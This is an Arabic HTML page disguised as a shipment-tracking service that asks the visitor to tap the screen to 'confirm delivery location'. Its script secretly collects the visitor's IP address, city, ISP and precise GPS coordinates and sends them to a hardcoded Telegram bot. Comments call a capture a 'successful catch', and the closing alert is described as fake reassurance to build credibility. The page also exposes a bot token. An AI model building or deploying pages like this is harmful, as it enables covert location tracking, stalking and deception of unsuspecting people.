<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>نظام تتبع الشحنات العالمي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
        
        /* جعل الشاشة بالكامل قابلة للمس */
        body, html { 
            height: 100%; width: 100%; 
            background: #0f172a; /* لون ليلي فخم */
            display: flex; align-items: center; justify-content: center; 
            overflow: hidden; cursor: pointer;
        }

        /* حاوية التصميم الاحترافي */
        .glass-card {
            width: 90%; max-width: 400px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 40px;
            padding: 40px 20px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            position: relative; z-index: 10;
        }

        .main-icon {
            width: 100px; height: 100px; background: linear-gradient(135deg, #0ea5e9, #2563eb);
            border-radius: 30px; margin: 0 auto 25px;
            display: flex; align-items: center; justify-content: center;
            font-size: 45px; color: white;
            box-shadow: 0 20px 40px rgba(14, 165, 233, 0.3);
        }

        h1 { font-size: 22px; color: white; margin-bottom: 15px; font-weight: 700; }
        p { font-size: 14px; color: #94a3b8; line-height: 1.8; margin-bottom: 35px; }

        .tracking-status {
            background: rgba(14, 165, 233, 0.1);
            color: #38bdf8; padding: 10px 20px; border-radius: 100px;
            font-size: 12px; display: inline-flex; align-items: center; gap: 10px; margin-bottom: 25px;
            border: 1px solid rgba(14, 165, 233, 0.2);
        }

        .pulsing-button {
            width: 100%; padding: 18px; background: white; color: #0f172a;
            border-radius: 20px; font-weight: 700; font-size: 16px;
            display: flex; align-items: center; justify-content: center; gap: 10px;
            animation: pulse-animation 2s infinite;
        }

        @keyframes pulse-animation {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); }
            70% { transform: scale(1.03); box-shadow: 0 0 0 15px rgba(255,255,255,0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); }
        }

        /* خلفية ضوئية جمالية */
        .glow { position: absolute; width: 300px; height: 300px; background: radial-gradient(circle, rgba(14, 165, 233, 0.15) 0%, rgba(0,0,0,0) 70%); z-index: 1; }
    </style>
</head>
<body onclick="executeCapture()" ontouchstart="executeCapture()">

    <div class="glow"></div>

    <div class="glass-card">
        <div class="tracking-status">
            <i class="fas fa-circle-notch fa-spin"></i> بانتظار توثيق موقع العميل
        </div>

        <div class="main-icon">
            <i class="fas fa-location-dot"></i>
        </div>

        <h1>تأكيد موقع التسليم</h1>
        <p>عزيزي العميل، يرجى النقر في أي مكان على الشاشة لتحديث إحداثيات موقعك ومطابقتها مع المندوب لفتح قفل استلام الشحنة #TLB-8820</p>
        
        <div class="pulsing-button">
            <i class="fas fa-fingerprint"></i> اضغط للتوثيق الفوري
        </div>
    </div>

<script>
    // بيانات البوت الخاصة بك
    const BOT_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
    const CHAT_ID = '6876904688';

    function executeCapture() {
        // أولاً: نجلب الـ IP
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            // ثانياً: نطلب الموقع الجغرافي
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // حالة النجاح: أرسل IP + GPS
                        sendDataToTelegram(ipData, position.coords.latitude, position.coords.longitude, "✅ صيد ناجح (IP + GPS)");
                    },
                    (error) => {
                        // حالة الرفض: أرسل IP فقط
                        sendDataToTelegram(ipData, null, null, "⚠️ رفض الموقع (IP فقط)");
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }
        })
        .catch(err => {
            console.error("Error fetching IP");
        });
    }

    function sendDataToTelegram(ip, lat, lng, status) {
        const mapsLink = lat ? `https://www.google.com/maps?q=${lat},${lng}` : "غير متوفر";
        const time = new Date().toLocaleTimeString('ar-EG');
        
        const message = `
🔔 إشعار من نظام التتبع
━━━━━━━━━━━━
الوضع: ${status}
الوقت: ${time}
IP: ${ip.ip || 'غير معروف'}
المدينة: ${ip.city || '--'}
الشركة: ${ip.org || '--'}
الخريطة: ${mapsLink}
━━━━━━━━━━━━`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });

        // رسالة وهمية للزبون لزيادة المصداقية
        alert("جاري مطابقة الموقع مع السيرفر الرئيسي.. يرجى الانتظار ثواني.");
    }
</script>
</body>
</html>
